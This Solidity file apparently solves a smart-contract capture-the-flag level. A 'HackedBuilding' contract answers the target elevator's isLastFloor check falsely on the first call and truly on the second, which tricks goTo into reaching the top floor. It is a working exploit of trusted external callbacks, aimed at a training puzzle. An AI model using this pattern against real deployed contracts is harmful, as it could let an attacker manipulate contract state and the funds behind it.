// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

interface IElevator {
  function goTo(uint _floor) external;
}

contract HackedBuilding is Building {
  bool public calledOnce = false;

  function isLastFloor(uint) public override returns (bool) {
    if (calledOnce == false) {
        calledOnce = true;
        return false;
    } else {
        calledOnce = false;
        return true;
    }
  }

  function setTop(uint _floor, address _elevatorAddr) public {
    IElevator elevator = IElevator(_elevatorAddr);
    elevator.goTo(_floor);
  }
}